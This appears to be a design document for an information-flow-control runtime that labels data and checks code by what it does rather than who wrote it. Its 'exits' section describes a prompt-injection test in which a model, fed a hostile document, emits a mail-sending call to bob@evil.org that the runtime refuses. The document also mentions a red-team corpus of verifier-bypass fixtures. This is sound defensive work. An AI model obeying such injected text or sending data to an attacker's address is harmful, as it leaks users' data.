# How it works

Give a value metadata that travels with it — where it came from, and what
may be done with it — and make that metadata content-addressed rather
than asserted, and three things follow. Code that derives from the value
inherits its constraints without having been written to know they exist,
so a transformation nobody audited cannot launder a restriction off.
A second machine can check what arrived instead of trusting whoever sent
it, so the constraint survives the network rather than ending at a trust
boundary. And "may this code run on my data" stops being a question about
the code's author, which is the only reason it is safe to run a program a
model wrote thirty seconds ago. Policies stop being something an
application enforces and become something the data carries.

Those are different physics of trust from the ones networked software
runs on today: how your data may be used becomes structurally aligned
with your interests. Structurally, meaning it does not rest on the
program behaving well or on its author having meant well.

This document is the runtime that does that. Every path below is in this
repository, every command was run to produce the output shown, and the
snippets are verbatim from the file named, reflowed to fit. Where a
mechanism is built but not yet switched on by default, it says so.

<!-- check-docs: excerpts -->

## Two readers, one table

Alice and Bob run two separate runtimes with separate identities against
one shared SQLite table in one space, and issue the same query. Ten
seconds, offline, no browser, no server:

```
cd packages/patterns
deno test -A integration/sqlite-read-clearance-multi-runtime.test.ts
```

The test first establishes that the table is genuinely shared — without
clearance, both readers see all three rows. Then, with it:

```ts
assertEquals(aliceClear.result?.map((r) => r.body), ["alice-1", "alice-2"],
  "alice must see exactly her rows");
```

Alice's withheld count is 1, Bob's is 2. And the raw stored result
document is checked, not just the reader's view
(`integration/sqlite-read-clearance-multi-runtime.test.ts`):

```ts
const bobFlat = JSON.stringify(bobRaw);
for (const leaked of ["alice-1", "alice-2"]) {
  assert(!bobFlat.includes(leaked),
    `withheld row content "${leaked}" leaked into bob's raw result doc`);
}
```

No application code decides who sees what. The rest of this document is
how that happens.

Two opt-ins are required in the pattern — `table(..., { allowReadClearance:
true })` and `db.query(..., { readClearance: true })`. Absent either, the
gate errors rather than silently applying
(`packages/runner/src/builtins/sqlite/row-label-read.ts`).

## The label is data, and the row derives its own

From `packages/patterns/cfc-row-label-records/main.tsx`, the whole rule:

```tsx
(f) => ({
  confidentiality: all(
    principal("mailto", match(f.patient_email, ADDR, { min: 1 })),
    dbOwner(),
  ),
})
```

That is an ordinary arrow function in a TypeScript file. It does not
survive compilation as code:

```
deno task cf check packages/patterns/cfc-row-label-records/main.tsx \
  --pattern-json --root packages/patterns
```

```json
"rowLabel": {
  "version": 1,
  "confidentiality": {
    "allOf": [
      { "principal": { "protocol": "mailto", "of": { "match": {
          "field": "patient_email",
          "source": "[^\\s<>,;\"]+@[^\\s<>,;\"]+", "flags": "g", "min": 1 } } } },
      { "dbOwner": true }
    ]
  }
}
```

The closure is gone, replaced by a declarative tree the storage engine
evaluates per row. A column can also carry a static label — `ssn:
{ type: "string", ifc: { confidentiality: ["pii"] } }` — and the emitted
query node carries its own declared ceiling.

## The code is constrained by what it does, not who wrote it

`packages/patterns/counter/counter.tsx` is ordinary TypeScript. Nothing
in it mentions policies, capabilities, or labels. One input is annotated
`Writable<number | Default<0>>`, and two closures use it — an `action`
that only writes, a `computed` that only reads:

```
deno task cf check packages/patterns/counter/counter.tsx --show-transformed --no-run
```

The writer's capture:

```ts
const __cfHandler_1 = __cfHelpers.handler(
  false as const satisfies __cfHelpers.JSONSchema,
  {
    type: "object",
    properties: {
      value: { type: "number", "default": 0, asCell: ["writeonly"] },
    },
    required: ["value"],
  } as const satisfies __cfHelpers.JSONSchema,
  (_, { value }) => { value.increment(-1); },
);
```

The reader's:

```ts
const __cfLift_1 = __cfHelpers.lift<
  { value: __cfHelpers.ReadonlyCell<number | Default<0>> },
  string
>(
  ({ value }) => `Counter: ${value.get()}`,
  {
    type: "object",
    properties: {
      value: { type: "number", "default": 0, asCell: ["readonly"] },
    },
    required: ["value"],
  } as const satisfies __cfHelpers.JSONSchema,
  { type: "string" } as const satisfies __cfHelpers.JSONSchema,
  { completeSchedulerScopeSummary: true },
);
```

Same cell, same annotation, two schemas differing in one token. The
author wrote neither. `readonly` and `writeonly` were computed from what
each closure body does
(`packages/ts-transformers/src/policy/capability-analysis.ts`).

Two consequences. Least privilege is derived rather than declared, so it
cannot drift from the code it describes. And the unit of capture is a
named field with a schema, so touching one confidential cell does not
contaminate everything downstream.

There is no signature check, no author allow-list, and no first-party
path. The runtime has nowhere to put the answer.

## The author cannot cheat

Capabilities and schemas are derived from types, which makes the type
system load-bearing. So the escape hatch is closed
(`packages/ts-transformers/src/transformers/cast-validation.ts`, the
first of 26 pipeline stages):

```
error: Double-casting via 'as unknown as' is not allowed.
Casts bypass reactive tracking and type safety.
```

A pattern also cannot mint the evidence its own gates require. Declaring
`InjectionSafe` on your own data gets the claim stripped at persist and
the dependent write rejected
(`packages/runner/test/cfc-integrity-mint-gate.test.ts`):

```ts
it("does not let an author-declared InjectionSafe satisfy a requiredIntegrity gate", async () => {
  const digest = tx.prepareCfc();
  expect(digest).toBe("");
  const result = await tx.commit();
  expect(result.error?.message).toContain("requiredIntegrity failed");
```

The second case repeats the proof across seven forged evidence atoms.
Nineteen atom types are runtime-minted, along with the compiler
attestation and the system string atoms listed in `CFC_SYSTEM_STRING_ATOMS`
(`packages/api/cfc.ts`), among them Loom's verified external identity; an
author-declared one survives only when the writer's identity is a builtin
(`packages/runner/src/cfc/prepare.ts`).

The runtime does not trust its own compiler either: the classification
the transformer emitted is re-derived from the emitted bytes by a
separately written parser, which has an adversarial corpus of 59
hand-built attack fixtures
(`packages/runner/test/esm-verifier-adversarial.test.ts`):

```ts
// Each fixture is a compiled-CommonJS body an attacker might hand-craft to defeat
// the verifier — the same bytes the SES compartment would evaluate. Brainstormed
// red-team style (no execution); most must be REJECTED. A few legitimate forms
// are negative controls (accept). The reject cases double as bypass detectors:
// if the verifier accepts one, that's a real gap.
```

Enforcement is also a ratchet. Any code holding a `Cell` can reach
`cell.tx`, so weakening the enforcement mode on a transaction throws
rather than succeeding
(`packages/runner/src/storage/extended-storage-transaction.ts`).

The obvious objection is that none of this is new. Flow control has been
understood for decades and has mostly stayed in research systems,
because the labels multiply and writing policies that compose takes
expertise. That cost is real and has not gone away; what changed is who
pays it, and how often. A model will grind against the compiler with
more patience than a person has, and what it produces is a file — once a
pattern satisfies the checker it satisfies it for everyone who runs it.
The labor becomes machine time spent once rather than expertise spent
per team, which is the difference between a technique that stays in the
lab and one that ships.

## Authorizing a write, when the code asking is untrusted

Which raises the obvious question: if no code is trusted, how does
anything you authorize ever happen? A field can require that its write
came from a named function, invoked through a named surface. From
`packages/patterns/cfc-authorized-save/main.tsx`, two buttons — the
second wired to the same stream as the reviewed one:

```tsx
<cf-label>
  This plain host button reuses the same stream but is not the
  reviewed trusted surface.
</cf-label>
<cf-button id="legacy-save-button" onClick={trustedSave.save}>
  Save title
</cf-button>
```

A real Chrome click on that button is a genuine user gesture —
`isTrusted` is true. It does not save. What fails is surface identity and
writer identity, checked independently: the renderer's own unforgeable
mark on the event, and a write attributed to the content-addressed
identity and binding path of the reviewed handler. The browser test
clicks both (`packages/patterns/integration/cfc-authorized-save.test.ts`):

```ts
it("accepts the trusted surface and rejects a lookalike host button", ...)
  await legacyButton.click();
  assertEquals((await savedTitleBeforeTrustedClick.innerText())?.trim(), "");
```

It then clicks the reviewed surface and the title appears. What this
attests is surface origin, not human intent — the repo's own test file
says so, since a synthesized DOM event also carries `isTrusted`.

## Across machines: carry the reference, not the bytes

A label is only useful if it survives leaving the machine that made it.
`packages/runner/test/cfc-cross-space-integrity.test.ts` walks the
scenarios: a cross-space link retains the source integrity plus an
endorsement, a copy of that link carries and verifies, and

```ts
it("scenario 1d — a tampered exactCopyOf (copy ≠ source) is rejected", ...)
```

Provenance is what makes that checkable. A module's identity is its
content hash, `cf:module/<hash>`, and the registry is a WeakMap populated
only during verified evaluation — so an attacker-supplied function with
byte-identical source has no entry and resolves to nothing
(`packages/runner/src/harness/verified-provenance.ts`).

The boundary is the interesting part, and the file states it plainly:

> Once a handler materializes bytes, the runtime has no basis to attest
> they are the same labeled thing, so the copy is a fresh, unendorsed
> value. This is not a bug — it is why the REFERENCE (link) is
> load-bearing for cross-space integrity: carry the link, not the
> extracted bytes.

## Release is a decision, not a write

Labels only tighten. Join two labeled values and the result carries
both sets of rules, and a system that could only do that would soon be
unable to send anything anywhere — the summary of your mail could not
go to your accountant, because the mail could not. So the runtime has
one way to relax a rule, and it is not an edit to stored data. From
`packages/patterns/cfc-exchange-rules/direct-release.tsx`, the rule,
and the field that names it as its own release path:

```tsx
export const releaseToSpaceReader = exchangeRule({
  appliesTo: THIS_POLICY,
  pre: {
    integrity: [
      cfcPattern.hasRole(v("reader"), THIS_POLICY.subject, "reader"),
    ],
  },
  post: {
    addAlternatives: [cfcPattern.user(v("reader"))],
  },
});
```

```tsx
message: Confidential<
  string,
  readonly [PolicyOf<typeof directReleaseRules>]
>;
```

The release path travels with the value rather than with the program
reading it. The rule may rewrite only the clause that names it; sibling
clauses, and anything derived from other inputs, stay conjunctive and
untouched
(`packages/runner/test/cfc-module-policy-eval.test.ts`):

```ts
it("keeps wrong-subject evidence closed and sibling clauses untouched", () => {
```

And it fires on evidence — a membership fact the runtime minted, not a
string the pattern supplied — which is the same integrity axis the mint
gate above protects. Two switches govern this, and both are built:
`cfcPolicyEvaluation`, which decides whether rules are evaluated at the
commit and sink gates, is pinned to `enforce` in the core preset, so the
rule above is consulted there; the render ceiling, which mints that
membership fact (`packages/runner/src/cfc/render-ceiling.ts`), is
complete and ships as a browser toggle. The display boundary follows
the render ceiling rather than the dial: it consults the rule wherever
the ceiling is on, reading the manifest the label pins from the space
the label is stored in, so the owner and each verified reader of the
policy's subject space see the value and nobody else does
(`packages/runtime-client/test/backends/render-audience.test.ts`).

The stored label never loosens. Under `cfcDeclaredMonotonicity: "enforce"`
a re-mint that drops a clause is refused, naming the document, the path
and the direction
(`packages/runner/test/cfc-declared-monotonicity.test.ts`):

```ts
expect(message).toContain("declared-monotonicity confidentiality");
expect(message).toContain(result.docId);
expect(message).toContain("at /out");
```

The one seam that can widen a stored label requires a builtin identity;
the same file shows pattern and handler code failing closed against it,
with or without a verified identity of its own. That dial is off in the
core preset and pinned to `enforce` in the `MAX_ENFORCEMENT_CFC_OPTIONS`
bundle (`packages/runner/src/runtime-presets.ts`).

A durable release — this value, to that person, until revoked — is a
grant: a content-addressed record at a reserved address, written only
through `writeCfcGrant` and consulted when a rule is evaluated, so
revoking it is an edit to the grant rather than to the data. An
unprivileged write into that namespace fails closed at prepare
(`packages/runner/src/storage/interface.ts`). A grant can be single-use,
in which case the release and its receipt commit together
(`packages/runner/test/cfc-single-use-grants.test.ts`):

```ts
// The receipt write is staged in the SAME transaction (atomic).
expect(stagedReceiptWrite(first.tx, receiptId)).toBe(true);
...
// Second evaluation: the receipt exists → the rule no longer fires →
// fail closed, exactly like revoked/expired.
```

The receipt rides on the commit-preconditions flag, which is on by
default with a rollback override; with it off, a single-use grant is
unsatisfiable rather than silently multi-use (same file). So every
relaxation is either a rule the data itself named, or a record. Who may write the rule, and at which boundary, is where the real
design difficulty lives, and it is the part of this system most worth
arguing with.

## The exits

A pattern runs in a compartment whose globals are installed deliberately
(`packages/runner/src/sandbox/compartment-globals.ts`), because the
checker only sees writes: a timer or shared memory is a channel through
which a program can signal what it knows without ever writing it down,
so those are absent, and the clock and the random source are coarsened.
Covert channels that do not leave through a named exit are handled
elsewhere and this document does not cover them:
`packages/utils/src/sandbox-contract.ts` lists the withheld globals,
recording beside each the channel it closes or that nothing has
supplied it,
and `docs/specs/sandboxing/TIMING_SIDE_CHANNELS.md` tables every
real-time-correlated signal a pattern can reach with its status, its
mitigation, and the test pinning it.

Reactive egress leaves through a named sink, and the sinks are one
enumerable list (`packages/runner/src/cfc/sink-inventory.ts`):

```ts
export type InitialSinkName =
  | "fetchBinary"
  | "fetchText"
  | "fetchJson"
  | "fetchJsonUnchecked"
  | "fetchProgram"
  | "streamData"
  | "llm"
  | "llmDialog"
  | "generateText"
  | "generateObject";
```

`llm` and `generateText` are exits in exactly the sense `fetchJson` is,
which makes prompt injection a dataflow question rather than a prompting
one. `packages/runner/test/cfc-agent-prompt-injection-demo.test.ts` runs
a real runtime at the default enforcement mode through a real tool loop.
The model is given a hostile document and capitulates completely: it
emits `sendMail(recipient: "bob@evil.org")` as a literal. The runtime
refuses it:

```ts
const emails = ((await t.result.key("emails").pull()) ?? []) as SentEmail[];
expect(emails).toEqual([]);
...
expect(output.type).toBe("error-text");
expect(output.value).toContain("Tool call denied");
expect(output.value).toContain("requires integrity");
```

The legitimate path succeeds by passing the recipient as a reference to a
cell whose integrity was written under builtin identity, not as a string
the model chose. The claim is not that the model resists injection — the
model is the attacker's to choose, and here it does exactly what the
attacker asked. The claim is that the routing field is refused anyway,
and the refusal returns to the model as a tool error rather than being
silently swallowed. The design never bets that models are untrustworthy,
and never bets that they are trustworthy either; it needs only that a
model's output is data carrying a record of where it came from.
Indifference is more durable than either bet.

That test drives a recorded model fixture rather than a live endpoint,
and it isolates the integrity axis; confidentiality is out of its scope.

That is narrower than "injection is solved." The attack has to cross a
boundary the runtime checks, where the test is provenance rather than
content; an attack staying inside what a pattern may already do is not
addressed. What is gone is the dependence on the model's judgment.

It generalizes because injection was never really about models. Software
today asks you to trust the author of everything you run, which makes the
trusted computing base the entire program — and injection is what a
trusted base that large looks like once the thing inside it can be talked
to. The answer here is the same one the runtime gives everywhere else:
check the flow, not the author.

## What runs this

Every authored pattern entry file in the repository is compiled,
transformed and SES-verified on every pull request
(`deno task cfcheck`). A second gate (`deno task pattern-compat`)
replays each of those patterns against every contract recorded for it
under `packages/patterns/baselines/`, because the updater performs no
structural check before swapping a pattern onto a running piece.
Pattern tests run at `enforce-strict`, the same mode the servers run,
rather than in an observe mode that would let violations pass. That
is the runtime's default, no flag sets it, and both server hosts are
pinned to it (`packages/runner/src/runtime.ts`, `runtime-presets.ts`);
a test that needs a laxer rung states one.
The two-readers test at the top of this document runs at that plain
default. A grep will also turn up
`DEFAULT_CFC_ENFORCEMENT_MODE = "disabled"` in `cfc/types.ts`, which is
the transaction-level default, not this one.

The flow-control layer is `packages/runner/src/cfc/`: about 50 modules
and 26,000 lines, with about 150 test files beside them in
`packages/runner/test`. Every dial it exposes is implemented; what
differs between hosts is which are switched on. The browser shell — the
product surface — runs label propagation at `persist`, so a value
derived from labeled data is written with its derived label rather than
laundering it away (`packages/lib-shell/src/runtime.ts`). Access control
on spaces defaults to `enforce` on the production server
(`packages/toolshed/env.ts`). The harness that dogfoods the runtime
turns the whole `MAX_ENFORCEMENT_CFC_OPTIONS` bundle on by default
(`packages/cf-harness/console/server.ts`), and its committed run ledgers
record real refusals. A property suite runs on every pull request with
labels persisted, because at the default rung "the properties below
would pass by finding nothing"
(`packages/cf-harness/test/cfc-properties/support/episode.ts`).

## What is not here yet

The remaining work is mostly wiring: deciding which host turns which
dial on, and turning it on without wedging the patterns already running.
In the core preset, label propagation, policy evaluation, the write
floor and the monotonicity gate are off, and the default sink ceiling is
empty; the shell and the harness are ahead of it, as above. The render
ceiling is a toggle rather than a default, and that boundary is held by
the label and contract layer rather than by DOM sanitization, which has
an open gap. `docs/development/EXPERIMENTAL_OPTIONS.md` carries every
dial, its status, and where it is headed.

Attestation — what would let a machine prove which runtime it is running
before your data arrives — is specified rather than built.
`docs/specs/verifiable-execution/` has the commit model, receipts, the
append-only log, and the trust profiles a verifier uses to say how much
of a claim it will take on evidence. That is a larger shape than this
document covers, including receipts that leave the fabric as claims other
systems can check. Two adjacent pieces do exist: confidential hardware
is provisioned in the infrastructure repository, and every binary built
on main carries signed build provenance, verified in the same job
(`.github/workflows/deno.yml`, `attest-binaries`). What is missing is
the path between them — nothing yet publishes a machine's measurement or
refuses a peer that cannot show one.

[Why](./why.md) is the argument in prose;
[the overview](./inverting-the-physics-of-trust.md) is the long form.
